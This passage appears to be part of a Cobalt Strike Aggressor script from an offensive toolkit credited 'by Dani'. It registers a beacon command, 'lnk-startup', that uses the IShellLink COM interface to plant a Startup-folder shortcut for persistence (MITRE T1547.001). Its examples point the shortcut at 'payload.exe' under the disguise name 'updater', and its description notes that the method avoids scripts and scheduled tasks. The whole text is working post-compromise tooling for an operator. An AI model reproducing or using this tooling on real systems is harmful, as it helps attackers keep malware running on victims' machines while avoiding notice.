    $lnkargs = $4;
    $remove  = $5;
    if ($name is $null || $target is $null) {
        berror($bid, "Use: lnk-startup <name> <target> [args] [remove]\nExample: lnk-startup updater C:\\Windows\\Temp\\payload.exe\nExample: lnk-startup updater C:\\Windows\\Temp\\payload.exe \"\" remove");
        return;
    }
    if ($lnkargs is $null) { $lnkargs = ""; }
    if ($remove is $null)  { $remove  = ""; }
    $args = bof_pack($bid, "zzzz", $name, $target, $lnkargs, $remove);
    dani_run($bid, "lnk-startup", $args);
}
beacon_command_register(
    "lnk-startup",
    "Startup folder LNK persistence via COM — T1547.001 (by Dani)",
    "Synopsis: lnk-startup <name> <target> [args] [remove]\n\n" .
    "Description: Create a .lnk shortcut in the current user's Startup folder\n" .
    "using the IShellLink COM interface (avoids writing scripts or schtasks).\n" .
    "Pass 'remove' as the last argument to delete the shortcut.\n\n" .
    "Examples:\n" .
    "  lnk-startup updater C:\\Windows\\Temp\\payload.exe\n" .
    "  lnk-startup updater C:\\Windows\\Temp\\payload.exe \"/silent\"\n" .
    "  lnk-startup updater C:\\Windows\\Temp\\payload.exe \"\" remove\n\n" .
    "MITRE ATT&CK: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder)\n\n" .
    "Phase: 5 — Persistence\nArgs: <name> <target> [args] [remove]"
);

